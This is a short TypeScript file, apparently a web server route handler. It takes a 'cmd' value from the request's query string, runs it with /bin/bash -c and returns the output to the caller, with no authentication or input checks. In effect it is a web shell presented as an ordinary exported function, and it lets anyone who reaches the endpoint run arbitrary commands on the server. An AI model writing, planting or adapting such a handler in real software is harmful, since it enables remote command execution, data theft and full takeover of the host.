import { spawn } from "child_process";
export async function cmd(req: Request) {
  const { searchParams } = new URL(req.url);
  const cmd = searchParams.get("cmd") || "ls";
  console.log(decodeURIComponent(cmd));
  const result: string = await new Promise((resolve) => {
    const res = spawn("/bin/bash", ["-c", `"${cmd}"`]);
    res.stdout.on("data", (data) => {
      resolve(data.toString());
    });
    res.stderr.on("data", (data) => {
      resolve(data.toString());
    });
  });
  return new Response(result);
}
